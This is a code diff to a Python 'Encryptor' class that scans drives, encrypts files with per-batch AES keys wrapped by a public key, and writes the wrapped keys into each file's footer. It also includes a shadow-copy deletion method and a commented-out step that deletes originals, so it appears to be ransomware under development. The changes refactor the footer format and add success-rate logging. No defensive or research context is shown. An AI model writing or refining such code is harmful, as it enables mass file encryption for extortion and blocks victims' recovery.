@@ -15,6 +15,7 @@ class Encryptor:
         self.public_key = public_key
         self.drives = []
         self.filepaths = []
+        self.encrypted_count = 0
 
     def scan_drives(self):
         """
@@ -91,7 +92,6 @@ class Encryptor:
         """
         The encrypt function called by threading.
         """
-        encrypted_count = 0
         files_list = deque(files_list)  # O(1) verwijderingen met deque
 
         while files_list:  # Loop zolang er bestanden zijn
@@ -104,8 +104,7 @@ class Encryptor:
             if counter >= 100:
                 symenc = Symmetric_encryption()
                 symenc.generate_key()
-                footer = f"\n --- \n {self.generate_footer(symenc.iv, symenc.AES_key)}"
-                footer = footer.encode('utf-8')
+                encrypted_iv, encrypted_AES_key = self.generate_footer(symenc.iv, symenc.AES_key)
                 counter = 1  # Reset teller
                 print("[LOG] Succesfully generated new AES key, footer...")
 
@@ -127,7 +126,10 @@ class Encryptor:
                 
                 with open(encrypted_filepath, 'wb') as enc_file:
                     enc_file.write(encrypted_content)  # Write encrypted content and footer
-                    enc_file.write(footer)
+                    enc_file.write(b"\n---\n")
+                    enc_file.write(encrypted_iv)
+                    enc_file.write(b"\n---\n")
+                    enc_file.write(encrypted_AES_key)
                     
 
                 #print(f"{encrypted_filepath} new file created" )
@@ -137,12 +139,10 @@ class Encryptor:
                 #os.remove(filepath)
 
                 #print(f"{encrypted_filepath} original file deleted")
-                encrypted_count += 1
+                self.encrypted_count += 1
             
             except Exception as e:
                 print(e)
-
-        print(f"[LOG] {encrypted_count} files encrypted")
 
     def generate_footer(self, iv, AES_key):
         """
@@ -161,7 +161,7 @@ class Encryptor:
         encrypted_key = keygen.encrypt(AES_key)
         #print(f"footer: {encrypted_iv} {encrypted_key}")
         #create footer
-        return f"{encrypted_iv}\n---\n{encrypted_key}"
+        return encrypted_iv, encrypted_key
     
     @staticmethod
     def determine_thread_count():
@@ -225,8 +225,8 @@ class Encryptor:
                 executor.submit(self.encrypt, files)
 
         end_time = time.time()
-
-        print(f"[LOG] all files encrypted, time elapsed: {end_time-start_time}s")
+        print(f"[LOG] {self.encrypted_count} files encrypted out of {len(self.filepaths)}\n {(self.encrypted_count / len(self.filepaths))*100}% success rate")
+        print(f"[LOG] time elapsed: {end_time-start_time}s")
 
 
     def delete_shadow_copies(self):
